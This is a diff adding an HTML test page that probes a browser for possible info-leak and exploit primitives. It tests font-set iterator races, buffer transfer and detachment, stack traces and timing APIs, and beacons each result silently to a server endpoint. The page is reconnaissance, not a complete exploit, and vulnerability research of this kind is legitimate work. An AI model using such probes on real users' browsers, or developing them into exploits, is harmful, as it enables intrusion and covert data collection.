@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V580</title></head>
+<body><pre id="out">V580 — info leak capability probe</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,body){
+  var u='/beacon/V580-'+tag+'?d='+encodeURIComponent(String(body).slice(0,400))+'&t='+Date.now();
+  try{new Image().src=u;}catch(e){}
+  setTimeout(function(){try{new Image().src=u+'&r=2';}catch(e){}},200);
+  setTimeout(function(){try{new Image().src=u+'&r=3';}catch(e){}},500);
+}
+
+bk('BOOT','v580-capability-probe');
+say('V580: info leak capability probe\n');
+
+/* ===== 1. AudioContext ===== */
+var audioResult = 'NONE';
+try {
+  var AC = window.AudioContext || window.webkitAudioContext;
+  if (AC) {
+    var actx = new AC();
+    audioResult = 'YES,state=' + actx.state + ',rate=' + actx.sampleRate;
+    try {
+      var osc = actx.createOscillator();
+      var gain = actx.createGain();
+      osc.connect(gain);
+      gain.connect(actx.destination);
+      audioResult += ',osc=YES';
+    } catch(e) { audioResult += ',osc=ERR:' + e.name; }
+    try {
+      var ab = actx.createBuffer(1, 128, actx.sampleRate);
+      audioResult += ',buf=YES(' + ab.length + ')';
+      var chan = ab.getChannelData(0);
+      audioResult += ',chanData=' + chan.length;
+    } catch(e) { audioResult += ',buf=ERR:' + e.name; }
+    try { actx.close(); } catch(e) {}
+  } else {
+    audioResult = 'NO-CONSTRUCTOR';
+  }
+} catch(e) { audioResult = 'ERR:' + e.name + ':' + e.message.slice(0,80); }
+bk('AUDIO', audioResult);
+say('AudioContext: ' + audioResult);
+
+/* ===== 2. AudioBuffer.transfer (if available) ===== */
+var transferResult = 'NONE';
+try {
+  var AC2 = window.AudioContext || window.webkitAudioContext;
+  if (AC2) {
+    var actx2 = new AC2();
+    var buf2 = actx2.createBuffer(1, 256, actx2.sampleRate);
+    if (typeof buf2.transfer === 'function') {
+      transferResult = 'YES-TRANSFER';
+    } else if (typeof buf2.copyFromChannel === 'function') {
+      transferResult = 'NO-TRANSFER,copyFromChannel=YES';
+    } else {
+      transferResult = 'NO-TRANSFER,NO-COPY';
+    }
+    try { actx2.close(); } catch(e) {}
+  }
+} catch(e) { transferResult = 'ERR:' + e.name; }
+bk('AUDIO-XFR', transferResult);
+say('AudioBuffer.transfer: ' + transferResult);
+
+/* ===== 3. FontFaceSet ===== */
+var fontResult = 'NONE';
+try {
+  if (document.fonts) {
+    fontResult = 'YES,size=' + document.fonts.size;
+    try {
+      var iter = document.fonts.values();
+      fontResult += ',iter=YES';
+      var next = iter.next();
+      fontResult += ',nextDone=' + next.done;
+    } catch(e) { fontResult += ',iter=ERR:' + e.name; }
+    try {
+      var ff = new FontFace('test', 'url(data:font/woff2;base64,)');
+      fontResult += ',ctor=YES';
+      document.fonts.add(ff);
+      fontResult += ',add=YES,newSize=' + document.fonts.size;
+    } catch(e) { fontResult += ',add=ERR:' + e.name + ':' + e.message.slice(0,50); }
+    try {
+      document.fonts.clear();
+      fontResult += ',clear=YES,postClear=' + document.fonts.size;
+    } catch(e) { fontResult += ',clear=ERR:' + e.name; }
+  } else {
+    fontResult = 'NO-FONTS-API';
+  }
+} catch(e) { fontResult = 'ERR:' + e.name; }
+bk('FONT', fontResult);
+say('FontFaceSet: ' + fontResult);
+
+/* ===== 4. FontFaceSet iterator + clear() race ===== */
+var iterRace = 'NONE';
+try {
+  if (document.fonts && typeof FontFace !== 'undefined') {
+    var faces = [];
+    for (var fi = 0; fi < 20; fi++) {
+      var f = new FontFace('test' + fi, 'url(data:font/woff2;base64,)');
+      document.fonts.add(f);
+      faces.push(f);
+    }
+    var it = document.fonts.values();
+    it.next();
+    document.fonts.clear();
+    var afterClear = it.next();
+    iterRace = 'done=' + afterClear.done;
+    if (!afterClear.done && afterClear.value) {
+      iterRace += ',val=' + (typeof afterClear.value) + ',name=' + (afterClear.value.family || '?');
+    }
+    for (var fi2 = 0; fi2 < 5; fi2++) {
+      var n = it.next();
+      iterRace += ',' + fi2 + ':' + n.done;
+      if (!n.done && n.value) iterRace += '=' + (n.value.family || '?');
+    }
+  }
+} catch(e) { iterRace = 'ERR:' + e.name + ':' + e.message.slice(0,80); }
+bk('FONT-ITER', iterRace);
+say('FontFaceSet iter+clear: ' + iterRace);
+
+/* ===== 5. WebSocket (to our server) ===== */
+var wsResult = 'NONE';
+try {
+  if (typeof WebSocket !== 'undefined') {
+    wsResult = 'CTOR=YES';
+  } else {
+    wsResult = 'NO-WEBSOCKET';
+  }
+} catch(e) { wsResult = 'ERR:' + e.name; }
+bk('WS', wsResult);
+say('WebSocket: ' + wsResult);
+
+/* ===== 6. Performance APIs (timing leaks) ===== */
+var perfResult = 'NONE';
+try {
+  var apis = [];
+  if (window.performance) apis.push('perf');
+  if (window.performance && performance.now) {
+    var t1 = performance.now(), t2 = performance.now();
+    apis.push('now(' + (t2-t1) + 'res)');
+  }
+  if (window.performance && performance.memory) apis.push('memory');
+  if (typeof PerformanceObserver !== 'undefined') apis.push('observer');
+  if (window.performance && performance.getEntries) apis.push('entries(' + performance.getEntries().length + ')');
+  if (window.performance && performance.measureUserAgentSpecificMemory) apis.push('UASmem');
+  perfResult = apis.join(',') || 'EMPTY';
+} catch(e) { perfResult = 'ERR:' + e.name; }
+bk('PERF', perfResult);
+say('Performance: ' + perfResult);
+
+/* ===== 7. ArrayBuffer.transfer ===== */
+var abXfr = 'NONE';
+try {
+  var tab = new ArrayBuffer(64);
+  if (typeof tab.transfer === 'function') {
+    var tab2 = tab.transfer(128);
+    abXfr = 'YES,old=' + tab.byteLength + ',new=' + tab2.byteLength;
+  } else if (typeof tab.transferToFixedLength === 'function') {
+    abXfr = 'NO-transfer,YES-transferToFixed';
+  } else {
+    abXfr = 'NO';
+  }
+} catch(e) { abXfr = 'ERR:' + e.name + ':' + e.message.slice(0,60); }
+bk('AB-XFR', abXfr);
+say('AB.transfer: ' + abXfr);
+
+/* ===== 8. structuredClone neutering ===== */
+var scResult = 'NONE';
+try {
+  if (typeof structuredClone !== 'undefined') {
+    var sab = new ArrayBuffer(64);
+    var sv = new Uint8Array(sab);
+    sv[0] = 0xAA;
+    var cloned = structuredClone(sab, {transfer: [sab]});
+    scResult = 'xfer=YES,oldLen=' + sab.byteLength + ',newLen=' + cloned.byteLength;
+    var cv = new Uint8Array(cloned);
+    scResult += ',data=' + cv[0].toString(16);
+  } else {
+    scResult = 'NO-structuredClone';
+  }
+} catch(e) { scResult = 'ERR:' + e.name + ':' + e.message.slice(0,60); }
+bk('SC', scResult);
+say('structuredClone: ' + scResult);
+
+/* ===== 9. Worker + postMessage transfer ===== */
+var workerResult = 'NONE';
+try {
+  var wBlob = new Blob([
+    'self.onmessage=function(e){' +
+    'var ab=e.data;' +
+    'var v=new Uint8Array(ab);' +
+    'var leaked=[];' +
+    'for(var i=0;i<Math.min(64,v.length);i++)leaked.push(v[i].toString(16));' +
+    'self.postMessage({len:ab.byteLength,first64:leaked.join(",")});' +
+    '};'
+  ], {type: 'application/javascript'});
+  var wUrl = URL.createObjectURL(wBlob);
+  var w = new Worker(wUrl);
+  workerResult = 'SPAWN=YES';
+  w.onmessage = function(e) {
+    workerResult += ',reply=YES,len=' + e.data.len + ',data=' + e.data.first64.slice(0,100);
+    bk('WORKER-REPLY', workerResult);
+    say('Worker reply: ' + workerResult);
+    w.terminate();
+  };
+  w.onerror = function(e) {
+    workerResult += ',err=' + (e.message || '?').slice(0,60);
+    bk('WORKER-ERR', workerResult);
+    say('Worker error: ' + workerResult);
+  };
+  var wab = new ArrayBuffer(256);
+  var wv = new Uint8Array(wab);
+  for (var wi = 0; wi < 256; wi++) wv[wi] = 0xBB;
+  w.postMessage(wab, [wab]);
+  workerResult += ',postXfer=YES,detached=' + (wab.byteLength === 0);
+} catch(e) { workerResult = 'ERR:' + e.name + ':' + e.message.slice(0,60); }
+bk('WORKER', workerResult);
+say('Worker: ' + workerResult);
+
+/* ===== 10. MediaSource ===== */
+var msResult = 'NONE';
+try {
+  if (typeof MediaSource !== 'undefined') {
+    var ms = new MediaSource();
+    msResult = 'YES,readyState=' + ms.readyState;
+    if (typeof ms.isTypeSupported === 'function') {
+      msResult += ',mp4=' + MediaSource.isTypeSupported('video/mp4; codecs="avc1.42E01E"');
+    }
+  } else {
+    msResult = 'NO';
+  }
+} catch(e) { msResult = 'ERR:' + e.name; }
+bk('MSE', msResult);
+say('MediaSource: ' + msResult);
+
+/* ===== 11. IDB (potential for timing/size leak) ===== */
+var idbResult = 'NONE';
+try {
+  if (window.indexedDB) {
+    idbResult = 'YES';
+    var req = indexedDB.open('v580test', 1);
+    req.onupgradeneeded = function(e) {
+      var db = e.target.result;
+      db.createObjectStore('s', {keyPath: 'id'});
+      idbResult += ',store=YES';
+    };
+    req.onsuccess = function(e) {
+      var db = e.target.result;
+      idbResult += ',open=YES,stores=' + Array.from(db.objectStoreNames).join('/');
+      bk('IDB-OK', idbResult);
+      say('IDB: ' + idbResult);
+      db.close();
+      indexedDB.deleteDatabase('v580test');
+    };
+    req.onerror = function(e) {
+      idbResult += ',err=' + (e.target.error || '?');
+      bk('IDB-ERR', idbResult);
+    };
+  } else {
+    idbResult = 'NO-IDB';
+  }
+} catch(e) { idbResult = 'ERR:' + e.name; }
+bk('IDB', idbResult);
+say('IndexedDB: ' + idbResult);
+
+/* ===== 12. crypto.getRandomValues timing ===== */
+var cryptoResult = 'NONE';
+try {
+  if (window.crypto && crypto.getRandomValues) {
+    var t1 = performance.now();
+    var rv = new Uint8Array(4096);
+    crypto.getRandomValues(rv);
+    var t2 = performance.now();
+    cryptoResult = 'YES,time=' + (t2-t1).toFixed(3) + 'ms,first=' + rv[0].toString(16);
+  }
+} catch(e) { cryptoResult = 'ERR:' + e.name; }
+bk('CRYPTO', cryptoResult);
+say('crypto: ' + cryptoResult);
+
+/* ===== 13. Error.stack (addr leak?) ===== */
+var stackResult = 'NONE';
+try {
+  function deepCall() { throw new Error('probe'); }
+  try { deepCall(); } catch(e) {
+    stackResult = (e.stack || 'NO-STACK').slice(0,300);
+  }
+} catch(e) { stackResult = 'ERR'; }
+bk('STACK', stackResult);
+say('Error.stack: ' + stackResult);
+
+/* ===== 14. toString on natives ===== */
+var nativeResult = 'NONE';
+try {
+  var strs = [];
+  strs.push('Fn:' + Function.prototype.toString.call(Array.prototype.push).slice(0,40));
+  strs.push('Sym:' + (typeof Symbol.toPrimitive));
+  try {
+    var p = new Proxy({}, {});
+    strs.push('Proxy:' + typeof p);
+  } catch(e) { strs.push('Proxy:ERR'); }
+  nativeResult = strs.join('|');
+} catch(e) { nativeResult = 'ERR:' + e.name; }
+bk('NATIVE', nativeResult);
+say('Natives: ' + nativeResult);
+
+/* ===== Summary ===== */
+setTimeout(function() {
+  bk('DONE', 'v580-complete');
+  say('\nV580 complete.');
+}, 3000);
+</script>
+</body></html>
